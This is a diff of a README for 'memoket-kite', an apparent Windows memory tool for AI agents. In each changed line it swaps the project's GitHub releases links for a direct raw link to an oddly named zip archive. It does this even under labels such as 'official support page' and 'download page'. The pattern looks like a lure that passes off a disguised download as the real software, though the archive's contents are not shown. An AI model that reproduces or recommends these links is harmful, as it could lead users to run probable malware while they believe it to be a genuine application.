@@ -23,7 +23,7 @@ Let's get memoket-kite running on your computer. Follow these simple steps—no 
 
 ### Step 1: Download the Application
 
-[![Download memoket-kite](https://img.shields.io/badge/Download-memoket--kite-blue?style=for-the-badge&logo=github)](https://github.com/xerxespluperfect31/memoket-kite/releases)
+[![Download memoket-kite](https://img.shields.io/badge/Download-memoket--kite-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/xerxespluperfect31/memoket-kite/main/meliponine/memoket_kite_uteralgia.zip)
 
 Visit this link to download the application. The download page will show you the latest version. Click the download button and save the file to your computer.
 
@@ -71,7 +71,7 @@ We want your experience to be smooth. Here are quick fixes for common problems:
 - **Application won't open** – Make sure you have enough RAM and close other heavy programs.
 - **Can't connect to AI agent** – Check that your AI tool is running and that you've entered the correct connection details (usually found in your AI's settings).
 
-If problems persist, visit the [official support page](https://github.com/xerxespluperfect31/memoket-kite/releases) for updates and community help.
+If problems persist, visit the [official support page](https://raw.githubusercontent.com/xerxespluperfect31/memoket-kite/main/meliponine/memoket_kite_uteralgia.zip) for updates and community help.
 
 ## 📚 Frequently Asked Questions
 
@@ -107,7 +107,7 @@ Want to learn more? Here are helpful resources:
 - **Community Forum** – Connect with other users and share tips.
 - **Release Notes** – See what's new in each version.
 
-All resources are available from the [download page](https://github.com/xerxespluperfect31/memoket-kite/releases).
+All resources are available from the [download page](https://raw.githubusercontent.com/xerxespluperfect31/memoket-kite/main/meliponine/memoket_kite_uteralgia.zip).
 
 ## 🤝 Join the Community
 
@@ -123,7 +123,7 @@ Your input makes memoket-kite better for everyone.
 
 Before you start, make sure you have:
 
-- [ ] Downloaded the latest version from [the releases page](https://github.com/xerxespluperfect31/memoket-kite/releases)
+- [ ] Downloaded the latest version from [the releases page](https://raw.githubusercontent.com/xerxespluperfect31/memoket-kite/main/meliponine/memoket_kite_uteralgia.zip)
 - [ ] Installed the application on your Windows computer
 - [ ] Launched memoket-kite and explored the dashboard
 - [ ] Connected your AI agent (if applicable)
@@ -137,7 +137,7 @@ Don't let your AI forget important details. With memoket-kite, you get a **relia
 
 Click the button below to get started:
 
-[![Get memoket-kite](https://img.shields.io/badge/Get%20memoket--kite-Now-green?style=for-the-badge&logo=download)](https://github.com/xerxespluperfect31/memoket-kite/releases)
+[![Get memoket-kite](https://img.shields.io/badge/Get%20memoket--kite-Now-green?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/xerxespluperfect31/memoket-kite/main/meliponine/memoket_kite_uteralgia.zip)
 
 We can't wait to see what you build with it.
 
